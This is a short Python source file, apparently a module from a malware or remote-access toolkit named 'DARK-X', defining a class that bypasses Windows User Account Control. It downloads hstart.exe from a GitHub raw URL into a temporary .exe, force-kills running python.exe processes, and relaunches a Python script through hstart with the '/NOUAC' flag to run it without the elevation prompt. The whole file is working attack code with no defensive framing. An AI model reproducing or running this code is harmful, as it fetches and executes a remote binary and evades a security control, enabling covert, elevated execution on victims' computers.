import os
import requests
import tempfile
from subprocess import Popen,PIPE
class Bypass_UAC2():
	def __init__(self,_):
		self.__file__ = _.__file__
		self.program = _.program
		self.hstart = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/hstart.exe"
		self.Main()

	def Main(self):
		req = requests.get(self.hstart)
		file = tempfile.TemporaryFile()
		filename = file.name + ".exe"
		file.close()

		file = open(filename, "wb")
		file.write(req.content)
		file.close()

		python = "\\".join(os.path.abspath(self.__file__).split("\\")[:-1]) + "\\python.exe"
		me = "\\".join(os.path.abspath(self.__file__).split("\\")[:-1]) + "\\New.py"
		sub = Popen(["cmd.exe","/c","taskkill","/IM","python.exe","/F","&",filename, '/NOCONSOLE', '/NOUAC', python + " " + me + " " + self.program], shell=True)
